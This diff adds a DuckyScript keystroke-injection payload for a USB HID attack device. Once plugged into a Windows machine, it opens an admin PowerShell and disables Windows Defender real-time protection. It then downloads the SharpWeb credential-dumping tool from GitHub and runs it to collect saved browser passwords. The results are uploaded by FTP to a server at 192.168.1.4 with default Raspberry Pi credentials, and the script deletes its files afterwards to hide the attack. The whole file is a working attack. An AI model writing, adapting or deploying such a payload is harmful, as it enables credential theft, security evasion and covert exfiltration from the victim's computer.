@@ -1,0 +1,68 @@
+REM Shamelessly stole the windows defender disable
+REM Windows 10: Disable Windows Defender with Powershell
+REM Author: Judge2020
+REM author website: Judge2020.com
+REM
+REM let the HID enumerate
+DELAY 1000
+GUI r
+DELAY 200
+REM my best attempt at a elevated powershell instance
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 200
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+
+REM ;;;;;;;;;;;;
+REM By this point, windows defender is disabled and we are in an admin shell. Now grab a list of passwords and upload it to ftp.
+REM ;;;;;;;;;;;;
+
+REM This is customized to my ftp server at home
+
+REM Step 1. Download sharpweb .NET 2.0 binary from github using wget (included in powershell)
+STRING wget "https://github.com/djhohnstein/SharpWeb/releases/download/v1.0/SharpWeb.exe" -O SharpWeb.exe
+ENTER
+DELAY 1500
+REM get timestamp
+STRING $TS=$(get-date -f MM-dd-yyyy_HH_mm_ss)
+ENTER
+STRING .\SharpWeb.exe all > sharpweb_results_$TS.txt
+ENTER
+DELAY 2000
+
+REM ;;;;;;;;;
+REM Got creds. Now upload them.
+REM ;;;;;;;;;
+
+STRING echo open 192.168.1.4 >> ftp.txt
+ENTER
+STRING echo pi >> ftp.txt
+ENTER
+STRING echo raspberry >> ftp.txt
+ENTER
+STRING echo put sharpweb_results_$TS.txt >> ftp.txt
+ENTER
+STRING echo bye >> ftp.txt
+ENTER
+
+STRING ftp -s:ftp.txt
+ENTER
+DELAY 1000
+STRING bye
+ENTER
+
+REM delete generated/downloaded files
+STRING del SharpWeb.exe
+ENTER
+DELAY 50
+STRING del sharpweb_results_$TS.txt
+ENTER
+DELAY 50
+STRING del ftp.txt
+ENTER
+DELAY 50
+STRING exit
+ENTER
